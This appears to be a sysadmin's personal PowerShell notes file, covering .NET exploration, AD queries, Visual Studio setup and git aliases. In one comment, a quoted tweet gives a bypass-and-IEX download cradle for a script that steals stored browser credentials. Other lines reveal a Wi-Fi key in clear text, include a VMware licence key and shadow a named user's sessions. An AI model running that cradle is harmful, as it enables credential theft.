

Beefarino Stupid PowerShell Tricks
  ScriptCS Linq queries
  -repl (rudimentary)
  StudioShell
  Simplex  P2F on Nuget SeeShell (plot)
  SQLite
  AutoVars

PowerShell custom object typenames
$p.pstypenames
$p.pstypenames.clear()
$p.pstypenames.Add('newtype')
$p.pstypenames.insert(0,'another')
$p.psobject.pstypenames.insert(0,'AThird')
$O | Add-Member -Type ScriptMethod -Name ToString -Value { $this.value } -force


get-counter '\\.\processor(_total)\% processor time' -samp 1 -continu  | Select -expand CounterSamples | Select CookedValue
netsh wlan show pro LearnQuick.com key=clear

# Find or replace matching string that does NOT match given case (in middle):
'string','STRING','String' -replace '(String)(?<!(?-i:String))', 'String'
'string','STRING','String' -match '(String)(?<!(?-i:String))'

(Get-Culture).TextInfo.totitlecase((Get-Culture).TextInfo.tolower('NASA'))
https://www.powershellmagazine.com/2013/07/24/pstip-how-to-convert-words-to-title-case/

https://github.com/leppie/IronScheme
https://github.com/BornToBeRoot/NETworkManager
https://gallery.technet.microsoft.com/scriptcenter/Get-Constructor-a8911ebe
https://cyberwardog.blogspot.com/2016/07/powershell-explore-net-classes-101.html

Add-Type -AssemblyName System.Web; [System.Web.HttpUtility] | gm -static
[System.Web.HttpUtility]::HtmlAttributeEncode((gc .\ic.ps1))

https://devblogs.microsoft.com/scripting/use-powershell-to-work-with-the-net-framework-classes/
Add-Type -AssemblyName System.ServiceProcess
$sc = "System.ServiceProcess.ServiceController" -as [type]
[reflection.assembly]::GetAssembly($sc)
GAC    Version        Location
—      ———            ——–
True   v2.0.50727     C:\Windows\assembly\GAC_MSIL\System.ServiceProcess\2.0.0.0_…
# The GetAssembly method returns the loaded assembly as an instance of the System.Reflection.Assembly class. This means that you can pass it to the Get-Member Windows PowerShell cmdlet and see what methods, properties and events are available. This is seen here.
[reflection.assembly]::GetAssembly($sc) | Get-Member
Add-Type -AssemblyName System.ServiceProcess
[System.ServiceProcess.ServiceController]::GetDevices($Env:computer)
Add-Type -AssemblyName System.speech
$talker = New-Object System.Speech.Synthesis.SpeechSynthesizer
$Talker.Speak("This is a test")
$Talker.SpeakAsync("This is a test")
ForEach ($Message in "This is a test", "another test", "A final test") { $Talker.SpeakAsync($message) }
[appdomain]::CurrentDomain
[appdomain]::currentdomain.GetAssemblies()
[appdomain]::currentdomain.GetAssemblies() | Foreach-Object {$_.gettypes()} | sort basetype # slow
https://social.technet.microsoft.com/Forums/scriptcenter/en-US/home?forum=ITCG
https://social.technet.microsoft.com/Forums/en-US/home?category=sysinternals&amp;filter=alltypes&amp;sort=lastpostdesc
https://social.technet.microsoft.com/wiki/contents/articles/25333.discover-the-dot-net-namespace-and-wmi-class-powershell.aspx#Domain_Controller_Port_Scanner

https://github.com/quozd/awesome-dotnet
https://github.com/aloisdg/awesome-linq
https://github.com/Cybermaxs/awesome-analyzers .NET Compiler Platform ("Roslyn") diagnostic analyzers and code fixes.
https://github.com/thangchung/awesome-dotnet-core
https://github.com/adamsitnik/awesome-dot-net-performance
https://github.com/heynickc/awesome-ddd
https://discoverdot.net/
https://csharpdigest.net/

https://haacked.com/archive/2007/06/13/the-most-useful-.net-utility-classes-developers-tend-to-reinvent.aspx/
[System.IO.Path] | gm -static
[System.IO.Path]::ChangeExtension('x.ps1',test)
$invalid = [System.IO.Path]::GetInValidFileNameChars()
((0..127 | % { [char]$_ | ? {$_ -notin $Invalid}}) -join '')
ChangeExtension
Combine
Equals
GetDirectoryName
GetExtension
GetFileName
GetFileNameWithoutExtension
GetFullPath
GetInvalidFileNameChars
GetInvalidPathChars
GetPathRoot
GetRandomFileName
GetTempFileName
GetTempPath
HasExtension
IsPathRooted
ReferenceEquals
AltDirectorySeparatorChar
DirectorySeparatorChar
InvalidPathChars
PathSeparator
VolumeSeparatorChar


# Adopted RipGrep rg, runiq, xsv to supplement PowerShell 
#AutoHotKey 2.0 https://autohotkey.com/download/2.0/ 2018-10-05 on 2018-11-11
#https://github.com/PowerShellOrg/pesterbookcode
#https://github.com/dfinke/PowerShellHumanizer.git
#https://github.com/adamdriscoll/snek.git  Use Python from PowerShell
#https://github.com/PowerShellOrg/pesterbookcode.git

# -k, --insecure        Allow conda to perform "insecure" SSL connections &  Anaconda/Conda update upgrade
#                       transfers. Equivalent to setting 'ssl_verify' 'false'
conda update --yes -n base conda   # Updating Python and Anaconda Conda 
conda update --all
conda update --yes --all
npm i -g npm -y                    # update npm node

vs_enterprise.exe --quiet --update  # First, update the Visual Studio installer: vs_enterprise.exe --quiet --update.
                                    #  Then, update the Visual Studio application itself:
vs_enterprise.exe update --installPath "C:\Program Files (x86)\Microsoft Visual Studio\2017\Enterprise" --quiet --wait --norestart
# .NET web and .NET desktop development, run:
vs_community.exe --layout c:\vs2017layout --add Microsoft.VisualStudio.Workload.ManagedDesktop --add Microsoft.VisualStudio.Workload.NetWeb --add Component.GitHub.VisualStudio --includeOptional --lang en-US
# .NET desktop and Office development, run:
vs_community.exe --layout c:\vs2017layout --add Microsoft.VisualStudio.Workload.ManagedDesktop --add Microsoft.VisualStudio.Workload.Office --includeOptional --lang en-US
# C++ desktop development, run:
vs_community.exe --layout c:\vs2017layout --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --lang en-US
# All features (this will take a long time—we have lots of features!), run:
vs_community.exe --layout c:\vs2017layout --lang en-US

Microsoft.VisualStudio.Product.Community
Microsoft.VisualStudio.Workload.WDExpress
Microsoft.VisualStudio.Product.BuildTools
Microsoft.VisualStudio.Product.TestAgent
Microsoft.VisualStudio.Component.FSharp	     #: FSharp language support	15.8.27825.0	Required
Microsoft.VisualStudio.Component.FSharp.WebTemplate
                     
Filter Get-Split {param([string[]]$Input,[string]$Delimiter=';') $Input | % { $_ -split $Delimiter} }

$global:DefaultVIServers 
Get-Process *powershell*,*rdp* -IncludeUserName
get-vm *beast*  # Just demo
(get-vm *dira4avspprod* | select powerstate,name,guest,Uid )
(get-vm *dira4avspprod* | select powerstate,name,Uid )
(get-vm *dira4avspprod* | select powerstate,name,Guest )

https://github.com/dotnet/cli/issues/3065
https://docs.nuget.org/consume/nuget-config-settings#proxy-settings validate that "classic" nuget actually works
dotnet restore fails behind proxy using windows authentication
Im currently using Fiddler as a local proxy using the "Automatically Authenticate" rule for our corporate proxy while the nuget config points to http://127.0.0.1:8888. Not very handy, but works as a temporary workaround.

try setting the http_proxy value of the NuGet Config File to point to your local CNtlm installation (e.g. http://127.0.0.1:3128)
CNtlm instead of Fiddler should work too. Its basically the same problem NPM, Bower et al have...

 @Michael-D-Pine
Michael-D-Pine commented on May 23, 2016
@axelheer I dont understand this, I have CNtlm installed and as far as I am aware working because I 
can use npm fine from a command line but this always fails, I dont think I have ever been able to 
get it work here are there environment variables or something else that needs to be set in a 
configuration file that will allow the dotnet restore command or other commands to work correctly ?

https://docs.nuget.org/consume/nuget-config-file

Filter Get-Split { param([string]$Delimiter=';') $_ -split $Delimiter }
sc.exe  triggerinfo w32time start/domainjoin start/domainleave
sc.exe qtriggerinfo w32time
sc.exe  triggerinfo w32time delete
DOMAIN JOINED STATUS : ddaf516e-58c2-4866-9574-c3b615d42ea1 [NOT DOMAIN JOINED]
 START SERVICE
   DOMAIN JOINED STATUS         : 1ce20aba-9851-4421-9430-1ddeb766e809 [DOMAIN JOINED]
 STOP SERVICE
   DOMAIN JOINED STATUS         : ddaf516e-58c2-4866-9574-c3b615d42ea1 [NOT DOMAIN JOINED]


Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -name Personal
Set-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -name Personal -Value 'D:\%UserName%\Documents' -Type ExpandString -Force
Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -name Personal
https://github.com/RamblingCookieMonster/WritingModules.git
https://github.com/ddneves/Book_Learn_PowerShell.git


<# D:\AvamarLinux #> portcheck 168.44.245.11 135,445,3389,5985
<#
168.44.245.11       open    open    open    open

135  = MS RPC (NetBIOS, authentication, legacy remote management)
445  = MS File Sharing -- SMB & CIFS
3389 = RDP (Terminal Services)
5985 = PowerShell Remoting (really it's WSMAN for WinRM service) 
#>

add-accelerator ErrorRecord System.Management.Automation.ErrorRecord

Install-Module PSJukebox
Invoke-PSJTune -Name imperial-march

Get-Variable | Where-Object { $_.value -and ($_.value -is 'array') -and $_.value.length -gt 200 }

AZURE, POWERSHELL Mount the Azure drive on Local PowerShell Console 
https://ridicurious.com/2018/06/28/mount-the-azure-drive-on-local-powershell-console/
AzurePSDrive) 
  Import-Module AzurePSDrive, SHiPS –Force
  Login-AzureRmAccount
  $param = @{
      Name       = 'Azure'
      PSProvider = 'SHiPS'
      Root       = 'AzurePSDrive#Azure'
      Scope      = 'Global'
  }
  New-PSDrive @Param
  Set-Location -Path Azure:        # Access the Azure PSDrive
  Get-ChildItem                    # List AzureRM subscriptions
  cd .\Pay-As-You-Go\              # Change directory to your subscription
  Get-ChildItem .\WebApps\         # List AzureRM resources
  Get-ChildItem .\VirtualMachines\

Setup PowerShell 5.1 Self Signed Certificate and sign Script
  https://1iq.uk/setup-powershell-5-1-self-signed-certificate-and-sign-script/
FSharp Dzoukr/OpenAPITypeProvider  https://github.com/Dzoukr/OpenAPITypeProvider

https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-2017
$SSMS = invoke-webrequest 'https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-2017' -UseBasicParsing 
$SSMS.links | ? OuterHTML -match 'Download SQL Server Management Studio ([.\d]{3,})\s*(Upgrade Package)?' | % { Write-Warning "[$($Matches[1])] [$($Matches[2])]"; $_ | Add-Member -MemberType NoteProperty -Name Version -Value $Matches[1] -force -PassThru | Add-Member -MemberType NoteProperty -Name Upgrade -Value ($Matches[2] -match 'Upgrade') -force -PassThru }  | select -first 1

'net use O: \\tsclient\C /persistent:yes' | out-file O.ps1

'C:\Program Files (x86)\Microsoft SQL Server\140\Tools\Binn\ManagementStudio'


Function Get-WhoAmI {
  [CmdletBinding()]param(
    [ValidatePattern('^(P|G|U|F|L|G|P|A)')][string]$Show = '',
    [switch]$UPN        = $False,
    [switch]$FQDN       = $False,
    [switch]$User       = $False,
    [switch]$LoginID    = $False,
    [switch]$Groups     = $False,
    [switch]$Privileges = $False,
    [switch]$All        = $False
  )
  $Switches = 'UPN', 'FQDN', 'USER', 'LOGONID', 'GROUPS', 'PRIV', 'ALL'
  $SwitchKey = If ($Show -match '^(P|G|UP|US|F|L|G|P|A)') {
    $Matches[1]
  } Else { 'xxx' }
  Write-Verbose "Show: $Show Switchkey: $Switchkey"
  # $Args = "$Switch"   
  $Switch = If ($Switches) { $Switches -match "^$SwitchKey" | Select -first 1 }
  If ($Switch -in 'GROUPS', 'PRIV', 'ALL') { 
    Write-Verbose "WhoAmI /$Switch /fo csv | convertfrom-csv"
    WhoAmI "/$Switch" /fo csv | convertfrom-csv
  } ElseIf ($Switch) {
    Write-Verbose "WhoAmI /$Switch | % { [PSCustomObject]@{ $Switch = `$_ } }"
    WhoAmI "/$Switch" | ForEach-Object { [PSCustomObject]@{ $Switch = $_ } }
  } Else {
    WhoAmI
  }
}

#Codacy?

tasklist /v      /fo csv | convertfrom-csv   # Tasklist with username user name processes
whoami   /groups /fo csv | convertfrom-csv
whoami   /priv   /fo csv | convertfrom-csv
whoami   /user   /fo csv | convertfrom-csv ; whoami /fqdn; whoami /upn; whoami /logonid; whoami /all 
driverquery /si  /fo csv | convertfrom-csv
driverquery /v   /fo csv | convertfrom-csv
systeminfo       /fo csv | convertfrom-csv
C:\Windows\System32\sort.exe
cmd /c help | sls '(?-i:^[A-Z]{2})' | Foreach-Object { 
  ($_ -split '\s\s+')[0] 
} | ? { (cmd /c help $_)  -match '/fo(rmat)?\b' } 
gps | ft id,name,*windowtitle*
tasklist /v /fo csv | convertfrom-csv | ? 'Window Title' -match '.'

https://www.amazon.com/Quick-Python-Book-Naomi-Ceder/dp/1617294039/ref=dp_ob_title_bk
https://www.amazon.com/Python-Tricks-Buffet-Awesome-Features/dp/1775093301/ref=pd_sim_14_6?_encoding=UTF8&pd_rd_i=1775093301&pd_rd_r=f18427ed-9650-11e8-97d0-034648083ec9&pd_rd_w=gvlzn&pd_rd_wg=pdLxV&pf_rd_i=desktop-dp-sims&pf_rd_m=ATVPDKIKX0DER&pf_rd_p=eb8198c1-8248-4314-940d-f60f1fec7e75&pf_rd_r=MYJWF9HS9S8YQSAPCSTN&pf_rd_s=desktop-dp-sims&pf_rd_t=40701&psc=1&refRID=MYJWF9HS9S8YQSAPCSTN

$f = 'Master Patching Server List v5-write.xlsx'
Function Select-SheetString {
  [CmdletBinding(DefaultParameterSetName='Path')]param(
    [Parameter(Position=0,ValueFromPipeline,ValueFromPipelineByPropertyName,
     Mandatory, ParameterSetName='Path')][Alias('FileName')]
    [string[]]$Path,
    
    [Parameter(Position=0,ValueFromPipeline,ValueFromPipelineByPropertyName,
     Mandatory, ParameterSetName='LiteralPath')]
    [Alias('Fullname','PSPath')]
    [System.IO.FileSystemInfo[]]$LiteralPath=@(),
    
    [Parameter(Position=1)][Alias('Filter')][string[]]$Pattern='.*',
    [Alias=('NotRegex')][string]$SimpleMatch
  )
  Begin {
    If ($PSBoundParameters.ContainsKey('SimpleMatch')) {
      $Simple = @{ SimpleMatch = $($PSBoundParameters.SimpleMatch) }
    } Else {
      $Simple = @{ SimpleMatch = $False }
    }
  }
  Process {
    $FileNames = If ($LiteralPath) { $LiteralPath } ElseIf ($Path) { $Path }
    ForEach ($file in $FileNames) {
      # $xmlfilenames = (7z l -r -so $file *.xml) -match '^\d{4}-\d\d-.*?\S\s\S{5}\s' | 
      #   % { $null,$null,$null,$fn = $_ -split '\s\s+'; $fn }
      # 7z x $file -Ot
      [xml]$strings = 7z x -so $file xl\SharedStrings.xml 
      Write-Verbose "String count: $($strings.count)"
      $strings.sst.si.t | Select-String $Pattern @Simple
    }
  }
  End {}
}

xcopy ($Profile -replace '^.:', '\\TSClient\C\Users') $Profile /d /y

<#
XpdfReader-win64-4.00.01.exe
Show Explorer or Group Policy mapped drives for Admin
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /D 1

https://www.fosshub.com/IrfanView.html/iview451_plugins_x64_setup.exe

Just wrote a little (3 Lines)script to extract stored credentials from Edge && IE
Code: https://t.co/dOJIw7DjNW
Usage: powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString(https://t.co/dOJIw7DjNW)"
#infosec #pentest #redteam https://t.co/gOTKzBPQNE (https://twitter.com/HanseSecure/status/988377489994022912?s=03)
#https://www.makeuseof.com/tag/3-scripts-modify-proxy-setting-internet-explorer/
# Windows Automation API: UI Automation https://msdn.microsoft.com/en-us/library/ms726294(VS.85).aspx
# AutoIT https://www.autoitscript.com/site/

Dump all server Cis in the CMDB..
Launch Service Flow from the DCS Portal home page > Published Reports > CMDB Assets > CMDB Assets Hardware > CMDB Hardware Asset Data.  
Interact online, or Tools > Export to CSV

  $webclient=New-Object System.Net.WebClient
  $creds=Get-Credential
  $webclient.Proxy.Credentials=$creds

# Adapted from https://workingsysadmin.com/finding-out-when-a-powershell-cmdlet-was-introduced/
https://github.com/PowerShell/PowerShell-Docs/search?q=Expand-Archive&unscoped_q=Expand-Archive
Function Get-FirstVersion {
  [CmdLetBinding()]Param(
    [Alias('CommandName')][string[]]$Name
  )
  $baseUri = 'https://docs.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Archive'
  ForEach ($Command in $Name) {
    ForEach ($Version in ('3.0','4.0','5.0','5.1','6')) {
      $Uri = ("$baseUri/$command" + "?view=powershell-$version")
      Write-Verbose $Uri
      $Request = try { Invoke-WebRequest -uri $Uri -MaximumRedirection 0 -ea Ignore } catch {}
      Write-Verbose "$Request"
      If ($Request -and ($Url = $Request.Headers.Location)) {
        Write-Verbose "$Url"
        If ($Url -notlike ‘*FallbackFrom*’) { 
          [pscustomobject]@{
            Name    = $Command 
            Version = [Version]$Version 
          }
        }  
      }  
    }  
  }
}
  
https://github.com/kirillkovalenko/nssm

DeDuplicate History
(gc $PSHistory | measure) | Select count 
(gc $PSHistory | select -unique) | out-file $PSHistory
(gc $PSHistory | measure) Select count

VMWare Key 5003J-6UJ4J-N8288-0V9A2-29GNM  VCenter VSphere VRealize???

CodeManager for PowerShell Snippets 
  "C:\Program Files (x86)\PowershellCodeManager\Start__CodeManager.cmd"
  'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Powershell CodeManager'
  dir 'C:\Program Files\PowerShellPlus\Script Samples\'
  ISE C:\Users\A469526\Documents\WindowsPowerShell\snippets\

SearchFileCmdlet_fs
https://blogs.msdn.microsoft.com/fsharpteam/2012/10/03/rethinking-findstr-with-f-and-powershell/

https://patrick6649.files.wordpress.com/2018/03/ad_final.zip PowerShell menu tool


High Performance PowerShell with LINQ  https://www.red-gate.com/simple-talk/dotnet/net-framework/high-performance-powershell-linq/

LiveEdu.tv Live Coding vs. Twitch (gaming)  Troop editor LiveCode.com

function Convert-Path {
  <#
    .SYNOPSIS
      A Convert-Path that actually returns the correct _case_ for file system paths on Windows
    .EXAMPLE
      New-PSDrive PS FileSystem C:\WINDOWS\SYSTEM32\WINDOWSPOWERSHELL
      Set-Location PS:\
      Convert-Path .\v*\modules\activedirectory
      
      The built-in Convert-Path would return:
      "C:\WINDOWS\SYSTEM32\WINDOWSPOWERSHELL\v1.0\modules\ActiveDirectory"
      
      This implementation would return the case-sensitive correct path:
      "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory"
  #>
  [CmdletBinding()]
  param(
    [Parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)]
    [ValidateNotNullOrEmpty()][Alias("PSPath")][string[]]$Path
  )
  process {
    # First, resolve any relative paths or wildcards in the argument
    # Use Get-Item -Force to make sure it doesn't miss "hidden" items
    $LiteralPath = @(Get-Item $Path -Force | Select-Object -Expand FullName)
    Write-Verbose "Resolved '$Path' to '$($LiteralPath -join ', ')'"
    # Then, wildcard in EACH path segment forces OS to look up the actual case of the path
    $Wildcarded = $LiteralPath -replace '(?<!(?::|\\\\))(\\|/)', '*$1' -replace '$', '*'
    $CaseCorrected = Get-Item $Wildcarded -Force | Microsoft.PowerShell.Management\Convert-Path
    Write-Verbose "Case correct options: '$($CaseCorrected -join ', ')'"
    # Finally, a case-insensitive compare returns only the original paths
    $CaseCorrected | Where-Object { $LiteralPath -iContains "$_" }
  }
}

Join-Path -Path (Get-PSDrive -PSProvider filesystem | ? { $_.root } | % { $_.Root }) -ChildPath Util -resolve -ea 0 2>$null
https://github.com/canix1/ADACLScanner
https://github.com/jimmehc/CmdMode
https://github.com/hugows/hf  HappyFinder 
  fzf is a blazing fast command-line fuzzy finder written in Go
    C:\ProgramData\chocolatey\lib\fzf\tools\fzf.exe
  Selecta is a fuzzy text selector for files and anything else you need to select
  Pick is "just like Selecta, but faster"
  icepick is a reimplementation of Selecta in Rust

(get-module azurerm* -list | group name | ? count -gt 1).name | % { get-module $_ -list | sort version | select -first 1 | % { uninstall-module $_.name -RequiredVersion $_.version -force } }

https://blogs.msdn.microsoft.com/kathykam/2006/03/29/net-format-string-101/
https://blogs.msdn.microsoft.com/kathykam/2006/09/29/net-format-string-102-datetime-format-string/

# Hi.  Can anyone explain an odd syntax with the Call operator as seen in 
# PowerShell In Action?    Given "$m = get-module <name>" you can then do  
# "& $m {whatever}"  - the script block is then executed inside the module's context! 


Chris Dent
  indented-automation/Start-Syslog.ps1 
  indented-automation/Get-FunctionInfo.ps1 
  http://www.indented.co.uk/cmdlets-without-a-dll/
  https://gist.github.com/indented-automation/81e2dc1fa1ba06f5023e535a8e1c2a50
  https://gist.github.com/indented-automation/81e2dc1fa1ba06f5023e535a8e1c2a50
https://www.red-gate.com/simple-talk/dotnet/net-framework/high-performance-powershell-linq/
https://docs.microsoft.com/en-us/powershell/wmf/5.0/feedback_symbolic
  Symbolic Links HardLinks Reparse Points Junction Points

$ArrayList = New-Object System.Collections.ArrayList
[void]$ArrayList.Add((get-random))
#or
$GenericList = New-Object 'System.Collections.Generic.List[System.Object]'
[void]$GenericList.Add((get-random))  
$GenericList.Add($x)

Git Log Display Git Display Log Colors
https://stackoverflow.com/questions/1838873/visualizing-branch-topology-in-git/34467298#34467298
git log --format=oneline
git lg

gwmi win32_bios -computer (adcomputer -filter "name -like '*'").name | select name, serialnumber

#Just online
(adcomputer -filter "name -like '*'").name | Out-File ADComputer.txt -encoding ASCII
portcheck ADComputer.txt 135 | ? { $_ -match 'open' } | ForEach-Object {
  $ComputerName, $State = $_ -split '\s+'
  # Write-Warning "[$ComputerName]"
  If ($bios = gwmi win32_bios -computer $ComputerName -ea ignore) {
    $bios | select @{N='ComputerName';E={$ComputerName}},@{N='BiosName';E={$_.Name}},SerialNumber
  } else {
    [pscustomobject]@{
      ComputerName = $ComputerName
      Name           = '' 
      SerialNumber   = ''
    }
  }
} | tee-object -variable BIOSVersion 

$BiosVersion.Computername | % { 
  $ComputerName = $_; 
  $Sessions = quser /server:$ComputerName 
}

$BiosVersion.Computername | % { Get-WinStaSession -computername $_ } | ? UserName -match 'Hmar' | % { Start-Shadow $_.UserName $_.ComputerName }





















































 
git log --graph --full-history --all --pretty=format:"%h%x09%d%x20%s"
& 'C:\Program Files\Git\bin\bash.exe' 
  git log --graph --full-history --all --color \
        --pretty=format:"%x1b[31m%h%x09%x1b[32m%d%x1b[0m%x20%s"
[Alias]
     lg = log --graph --pretty=format:'%Cred%h%Creset %ad %s %C(yellow)%d%Creset %C(bold blue)<%an>%Creset' --date=short
     hist = log --graph --full-history --all --pretty=format:'%Cred%h%Creset %ad %s %C(yellow)%d%Creset %C(bold blue)<%an>%Creset' --date=short

[alias]
    lg = !"git lg1"
    lg1 = !"git lg1-specific --all"
    lg2 = !"git lg2-specific --all"
    lg3 = !"git lg3-specific --all"

    lg1-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(auto)%d%C(reset)'
    lg2-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset)%C(auto)%d%C(reset)%n''          %C(white)%s%C(reset) %C(dim white)- %an%C(reset)'
    lg3-specific = log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold cyan)%aD%C(reset) %C(bold green)(%ar)%C(reset) %C(bold cyan)(committed: %cD)%C(reset) %C(auto)%d%C(reset)%n''          %C(white)%s%C(reset)%n''          %C(dim white)- %an <%ae> %C(reset) %C(dim white)(committer: %cn <%ce>)%C(reset)'
    
Get-ADObject -Filter 'objectClass -eq "siteLink"' -Searchbase (
    Get-ADRootDSE).ConfigurationNamingContext -Property Options, Cost, 
    ReplInterval, SiteList, Schedule | 
  Select-Object Name, @{Name="SiteCount";Expression={$_.SiteList.Count}}, Cost, 
  ReplInterval, @{Name="Schedule";Expression={If($_.Schedule) { 
    If (($_.Schedule -Join " ").Contains("240")) {"NonDefault"} 
    Else {"24x7"}}Else{"24x7"}}}, Options | Format-Table * -AutoSize
  
http://gpsearch.azurewebsites.net/  Azure GPO Group Search Find Azure Policy Search Find  
https://www.ghacks.net/2017/11/07/search-the-group-policy-with-microsofts-gpsearch-web-service/  
  http://wp.me/pLog8-71
https://4sysops.com/archives/four-ways-to-search-for-group-policy-settings/
  https://www.microsoft.com/en-us/download/details.aspx?id=25250
  http://www.software-virtualisierung.de/nit-gposearch.html
How to Get a Report on All GPO Settings 
  https://community.spiceworks.com/how_to/137260-how-to-get-a-report-on-all-gpo-settings
What you can do, should do and should NOT do with GPOs
  http://evilgpo.blogspot.com/2016/12/legalnoticecaption-and-legalnoticetext.html  
Function Find-GPOItem { 
  []
  $Search = Read-Host "What are you looking for?"
  start "http://gpsearch.azurewebsites.net/default.aspx?search=$Search"
}	

[System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSUseSingularNouns")]
[System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSAvoidUsingCmdletAliases",Justification="Resolution in progress.")]
   
start-transaction -whatif; Get-Process | Where-Object Path -match 'Nuance' | Stop-Process -force; Ren .\Nuance\ NuanceSave ; Complete-Transaction
"powershell.scriptAnalysis.settingsPath": "C:\\Users\\A469526\\Documents\\WindowsPowerShell\\Config\\ScriptAnalyzerProfile.txt",

https://blogs.technet.microsoft.com/poshchap/2017/09/22/one-liner-query-the-ad-schema-for-user-object-attributes/
Get-ADObject -SearchBase (Get-ADRootDSE).SchemaNamingContext -Filter {name -like "User"} -Properties MayContain,SystemMayContain |
Select-Object @{n="Attributes";e={$_.maycontain + $_.systemmaycontain}} | 
Select-Object -ExpandProperty Attributes |
Sort-Object

$obj.PSObject.Properties.Remove('Foo')

Get-ADObject -SearchBase (Get-ADRootDSE).SchemaNamingContext -ldapfilter '(systemFlags:1.2.840.113556.1.4.803:=4)' -Properties systemFlags |
Select-Object Name |
Sort-Object Name


Difficult Conversations
Primal Leadership
Necessary Endings 
The Power of Habit by Charles Duhigg
You've Only Got Three Seconds by Camille Lavington
embrace DevOp culture, where it comes from, why is it important and the reality of medium big businnesses, then you definitely want to read the Phoenix project 
Deep Work by Cal Newport. It's been a little while since I read, but what struck me most is the mindset to avoid distractions. 
The War of Art - about overcoming that nagging resistance to getting stuff done that we all feel. 



https://github.com/jamesottaway?language=powershell&tab=stars
https://github.com/dfinke/ImportExcel  # Finke
https://github.com/dfinke?tab=repositories
ahk.ahk, ahk.ps1???? Move to scripts?
https://github.com/PoshCode/ModuleBuilder/tree/master

https://github.com/PowerShell/platyPS
Install-Module -Name platyPS -Scope CurrentUser
Import-Module platyPS

Checking SSL status
# https://www.ssllabs.com/ssltest/index.html
# https://www.ssllabs.com/ssltest/analyze.html?d=git-scm.com&latest
# https://www.ssllabs.com/ssltest/analyze.html?d=git-scm.com&s=104.20.12.91&latest


C:\ProgramData\Ditto\Ditto.exe

Get-TroubleshootingPack -Path C:\Windows\Diagnostics\System\Aero
https://blogs.technet.microsoft.com/heyscriptingguy/2011/02/09/use-powershell-troubleshooting-packs-to-diagnose-remote-problems/

# Custom Objects Don Jones https://technet.microsoft.com/en-us/library/hh750381.aspx
<#
. ([scriptblock]::Create($((Get-Clipboard) -join "`n")))


gc C:\bat\Macros.txt |
  % { if ($_ -match '([^=\s]+)=(.+)') {
  	  ($macro, $expansion) = ($matches[1], $matches[2])
			$expansion = $expansion -creplace '\B\$T\B', '&'
			$expansion = $expansion -creplace '\$([\d])', '$args[$1]'
			$expansion = $expansion -creplace '([^)]+[)])', '$1 --%'
			$expansion = $expansion -creplace '\$\*', '$($args -join '' '') '       # --% '
#			if ($expansion -match '(.*)\$\*(.*)') {$expansion = "$($matches[1])" + ($args -join ' ') + ' --% ' + "$($matches[2])"}
      if ($expansion -match '[{}`''"><]') { $CloseBrace = "`n}"} else { $CloseBrace = '}' }
		  "function tm_$macro { & 'cmd.exe' /c $expansion $CloseBrace"
		}
  }

#	Temp-replace args and &  ==ARGSn==  ==ARGS*==
#	Escape special chars
#	Re-replace args


#>
# [enum]::getvalues([system.environment+specialfolder]) | foreach {"$_ maps to " + [system.Environment]::GetFolderPath($_)}

# while($true){cls;netstat -bantp tcp;sleep 5}
# Get-WmiObject -Namespace root\cimv2 -ComputerName . -Query "SELECT * from Win32_LogicalDisk WHERE FileSystem='NTFS' AND Description = 'Local Fixed Disk'"
# $env:path -split ';' | where {!(Test-Path $_  )}
#  ($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique
# [System.Environment]::SetEnvironmentVariable('Path',($env:path -split ';' | where {$_ -and (Test-Path $_  )}| select-object -unique) -join ';','Machine')
# [System.Environment]::SetEnvironmentVariable('Path','C:\ProgramData\Oracle\Java\javapath;c:\bat;c:\util;c:\unx\gnu\bin;c:\unx;C:\windows\system32;C:\windows;C:\windows\System32\Wbem;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\windows\System32\WindowsPowerShell\v1.0\;C:\PerlStrawberry\c\bin;C:\PerlStrawberry\perl\site\bin;C:\PerlStrawberry\perl\bin;C:\Program Files (x86)\Windows Kits\8.1\Windows Performance Toolkit\;C:\Program Files\Microsoft SQL Server\110\Tools\Binn\;C:\ProgramData\chocolatey\bin;C:\Program Files\Microsoft SQL Server\120\Tools\Binn\;C:\Program Files\Microsoft SQL Server\130\Tools\Binn\;C:\Program Files (x86)\nodejs\;C:\Program Files\Git\cmd;C:\Program Files\dotnet\;C:\Users\A469526\.dnx\bin;C:\rakudo\bin;C:\rakudo\share\perl6\site\bin;C:\Users\A469526\.lein\bin;C:\Program Files (x86)\Microsoft VS Code\bin;C:\Users\A469526\AppData\Roaming\npm')
# [System.Environment]::GetEnvironmentVariable('path','user')   'process' 'machine'
# (new-object System.Net.WebClient).Downloadfile("http://wordpress.org/latest.zip", "C:\Users\Brangle\Desktop\wp-latest.zip")
# (new-object -com SAPI.SpVoice).speak("Hi Carol  it is so good to see you again")
# function glc ([int []]$c=-1) {$c | % {(h)[$_].Commandline} | get-clipboard}
function Get-PreviousCommand([int []]$c=-1) {$c | % {(h)[$_].Commandline}} # + by ID, - by position
#  1..100 | %{ping -n 1 -w 15 11.2.7.$_ | select-string "reply from"}

#dir | ?{$_.LastWriteTime -ge [DateTime]::Today}
# (dir -include *.cs,*.xaml -recurse | select-string .).Count

